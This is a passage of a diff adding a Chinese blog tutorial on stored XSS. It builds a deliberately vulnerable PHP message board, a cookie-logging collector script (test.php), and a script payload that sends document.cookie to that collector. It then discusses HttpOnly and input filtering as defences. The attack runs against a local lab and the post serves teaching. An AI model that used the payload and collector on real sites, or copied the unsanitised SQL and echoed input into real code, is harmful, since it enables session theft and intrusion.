class="line">		 			echo &quot;&lt;script&gt;alert(&#39;注册成功&#39;)&lt;&#x2F;script&gt;&quot;,header(&quot;Location:login.php&quot;);;</span><br><span class="line">			&#125;else&#123;</span><br><span class="line">		 			echo &quot;&lt;script&gt;alert(&#39;注册失败&#39;)&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;	</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>留言板提交：message.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$message &#x3D; $_POST[&#39;mess&#39;];</span><br><span class="line"></span><br><span class="line">$db &#x3D; @mysqli_connect(&#39;localhost&#39;,&#39;root&#39;,&#39;root&#39;) or die(&quot;Fail&quot;);</span><br><span class="line">mysqli_select_db($db, &#39;xsstest&#39;);</span><br><span class="line">$sql &#x3D; &quot;insert into message_board(message) values(&#39;$message&#39;);&quot;;</span><br><span class="line">$result &#x3D; mysqli_query($db, $sql);</span><br><span class="line">				</span><br><span class="line">	</span><br><span class="line">if(!$result) &#123;</span><br><span class="line">	die(&#39;无法插入数据：&#39;.mysqli_error($db));</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;数据插入成功！\n&quot;;</span><br><span class="line">header(&#39;Location:index.php&#39;);</span><br><span class="line">mysqli_close($db);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="三、创建xss攻击文件"><a href="#三、创建xss攻击文件" class="headerlink" title="三、创建xss攻击文件"></a>三、创建xss攻击文件</h1><p>还是在phpstudy中WWW目录中创建两个文件，test.php和xss.php，我这里是在WWW目录下的CrackTest文件夹中创建的，这会影响到我们后面payload的构造！请大家仔细构造，不要盲目照抄。</p>
+<p>xss.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	echo $_GET[&#39;content&#39;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>test.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$cookie &#x3D; $_GET[&#39;cookie&#39;];</span><br><span class="line"></span><br><span class="line">$ip &#x3D; getenv(&#39;REMOTE_ADDR&#39;);</span><br><span class="line"></span><br><span class="line">$time &#x3D; date(&#39;Y-m-d g:i:s&#39;);</span><br><span class="line"></span><br><span class="line">$referer &#x3D; getenv(&#39;HTTP_REFERER&#39;);</span><br><span class="line"></span><br><span class="line">$agent &#x3D; $_SERVER[&#39;HTTP_USER_AGENT&#39;];</span><br><span class="line"></span><br><span class="line">$fp &#x3D; fopen(&#39;cookie.txt&#39;, &#39;a&#39;);</span><br><span class="line"></span><br><span class="line">fwrite($fp,&quot; IP: &quot; .$ip. &quot;\n Date and Time: &quot; .$time. &quot;\n User Agent:&quot;.$agent.&quot;\n Referer: &quot;.$referer.&quot;\n Cookie: &quot;.$cookie.&quot;\n\n\n&quot;);    &#x2F;&#x2F;写入文件</span><br><span class="line"></span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line">header(&quot;Location: http:&#x2F;&#x2F;www.baidu.com&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="四、上传payload获得用户Cookie"><a href="#四、上传payload获得用户Cookie" class="headerlink" title="四、上传payload获得用户Cookie"></a>四、上传payload获得用户Cookie</h1><p>首先我们模拟一个场景，黑客用户hacker想要通过向服务器中存入xss恶意代码，来攻击获得登陆这个页面的用户的Cookie和其它有用的信息。</p>
+<p>要想攻击的话，首先我们得有用户啊，所以我们先注册两个用户</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户名：hacker 密码：hacker &#x2F;&#x2F; 攻击者</span><br><span class="line">用户名：admin 密码：password &#x2F;&#x2F; 受害者</span><br></pre></td></tr></table></figure>
+<p>首先，我们作为hacker用户登录，然后将我们构造的payload加入到留言板中<br>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.open(\&#39;http:&#x2F;&#x2F;localhost&#x2F;CrackTest&#x2F;xsstest&#x2F;test.php?cookie&#x3D;\&#39;+document.cookie)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+<p>这里注意，我们构造的payload其实就是放入数据库中的数据字符串，只不过这个字符串是危险的，会被恶意执行的。在这里根据MySQL的语法规则，我们在单引号前加了反斜杠进行转义，否则会报错。localhost也可以写成自己的主机ip地址，这样收到的信息更逼真一点（流汗）。</p>
+<p><img src="https://img-blog.csdnimg.cn/20201106001947279.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>点击提交，跳转到百度页面，说明注入成功！<br><img src="https://img-blog.csdnimg.cn/20201106003227131.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>再打开我们第三步test.php所在的目录，有一个cookie.txt文件生成，里面就是我们hacker自己的cookie和一些信息。</p>
+<p><img src="https://img-blog.csdnimg.cn/20201106003538278.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>另建一个登陆页面，模仿这时你是admin用户登陆这个页面，这时候admin用户再登陆时就会中招！</p>
+<p><img src="https://img-blog.csdnimg.cn/20201106003625299.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h1 id="五、存储型XSS的防御"><a href="#五、存储型XSS的防御" class="headerlink" title="五、存储型XSS的防御"></a>五、存储型XSS的防御</h1><h2 id="1-设置HttpOnly标志"><a href="#1-设置HttpOnly标志" class="headerlink" title="1.设置HttpOnly标志"></a>1.设置HttpOnly标志</h2><p>HttpOnly标志可以有效防止非法用户通过Javascript读取cookie。<br>但是它真的安全吗？答案是否定的，HttpOnly只是不能读取cookie，但是我们还是可以写入cookie啊，这样就会产生别的问题，比如session fixation attack（会话固定攻击）。</p>
+<p>那么什么是会话固定攻击？</p>
+<p>会话固定攻击（session fixation attack）是利用应用系统在服务器的会话ID固定不变机制，借助他人用相同的会话ID获取认证和授权，然后利用该会话ID劫持他人的会话以成功冒充他人，造成会话固定攻击。</p>
+<p>我们先看一下HttpOnly怎么设置吧。</p>
+<p>我们在post.php页面中修改setcookie()的参数，改为<code>setcookie(&#39;username&#39;,$name,time()+3600,NULL,NULL,NULL,TRUE);</code>setcookie()函数里面第七个参数就是HttpOnly的设置。</p>
+<p>用admin账户登陆一下。然后这次盗取的内容在cookie.txt中，Cookie的值真的没有了。</p>
+<p><img src="https://img-blog.csdnimg.cn/20201106151234847.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h2 id="2-输入验证"><a href="#2-输入验证" class="headerlink" title="2.输入验证"></a>2.输入验证</h2><p>说到底，导致攻击代码成功的原因是我们没有进行输入验证，让攻击有机可乘，那么我们如果通过验证判断出payload，然后阻止它，会不会就安全一点了呢。</p>
+<p>修改message.php，加入对参数$message的判断：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$message &#x3D; $_POST[&#39;mess&#39;];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$message &#x3D; preg_replace( &#39;&#x2F;&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t&#x2F;i&#39;, &#39;&#39;, $message );</span><br><span class="line">&#x2F;&#x2F; $message &#x3D; trim($message); &#x2F;&#x2F; 去除字符串两端空格</span><br><span class="line">&#x2F;&#x2F; $message &#x3D; strip_tags( addcslashes($message)); &#x2F;&#x2F; addcslashes是在&#39;,&quot;,\,NULL等特殊字符前加入反斜杠转义</span><br><span class="line">&#x2F;&#x2F; strip_tags是去除html，php，xml的标签</span><br><span class="line">&#x2F;&#x2F; $message &#x3D; htmlspecialchars($message);</span><br><span class="line">&#x2F;&#x2F; htmlspecialchars是将html中一些敏感字符进行转义</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$db &#x3D; @mysqli_connect(&#39;localhost&#39;,&#39;root&#39;,&#39;root&#39;) or die(&quot;Fail&quot;);</span><br><span class="line">mysqli_select_db($db, &#39;xsstest&#39;);</span><br><span class="line">$sql &#x3D; &quot;insert into message_board(message) values(&#39;$message&#39;);&quot;;</span><br><span class="line">$result &#x3D; mysqli_query($db, $sql);</span><br><span class="line">				</span><br><span class="line">	</span><br><span class="line">if(!$result) &#123;</span><br><span class="line">	die(&#39;无法插入数据：&#39;.mysqli_error($db));</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;数据插入成功！\n&quot;;</span><br><span class="line">header(&#39;Location:index.php&#39;);</span><br><span class="line">mysqli_close($db);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>这里我们就不进行演示啦，代码里都有注释，大家可以自己尝试一下，输入的防御是参考DVWA存储型XSS防御的机制，有兴趣的朋友可以去看一下。</p>
+<p>以上我们的xss防御其实都是最初级的，真正有效的还是得看大佬的心得，这里安利一下：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/34949935">如何预防应用程序中的XSS漏洞</a></p>
+<p>完结撒花~~</p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
       
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2020" class="archive-year">2020</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/11/13/SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%8F%8ADVWA%E5%AE%9E%E6%88%98/" class="archive-article-date">
-  	<time datetime="2020-11-13T08:24:28.529Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-11-13</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2020/11/13/%E5%AE%9E%E6%88%98_%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%94%BB%E5%87%BB%E8%8E%B7%E5%8F%96Cookie%E5%8F%8A%E9%98%B2%E5%BE%A1/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/11/13/%E5%AE%9E%E6%88%98_%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%94%BB%E5%87%BB%E8%8E%B7%E5%8F%96Cookie%E5%8F%8A%E9%98%B2%E5%BE%A1/" class="archive-article-date">
-  	<time datetime="2020-11-13T08:21:17.339Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-11-13</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
 
+  
+<nav id="article-nav">
+  
+    <a href="/2020/11/13/SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%8F%8ADVWA%E5%AE%9E%E6%88%98/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
+        
+        
+    </div>
+</aside>
+
+
+
   
   
-    </div></section>
   
 
-    
+  
+
+  
+
+  
 
 
           </div>
@@ -230,8 +386,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
